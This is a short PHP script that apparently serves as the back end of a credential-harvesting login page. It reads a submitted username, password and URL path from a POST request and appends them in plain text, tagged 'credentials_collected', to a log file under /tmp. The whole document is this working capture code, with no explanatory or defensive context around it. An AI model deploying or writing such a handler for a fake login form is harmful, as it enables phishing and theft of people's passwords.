<?php
$myfile = fopen("/tmp/urlinput.log", "a", true) or die("Unable to open file!");
$user = input_validation($_POST["user"]);
$password = input_validation($_POST["password"]);
$urlpath = input_validation($_POST["urlpath"]);
$timestamp = date('m/d/Y H:i:s');
$logentry = '{"timestamp":"'.$timestamp.'","action":"credentials_collected","user":"'.$user.'","password":"'.$password.'","urlpath":"'.$urlpath.'"}';
fwrite($myfile, $logentry);
fwrite($myfile, "\r\n");
fclose($myfile);
function input_validation($data) {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
}
?>
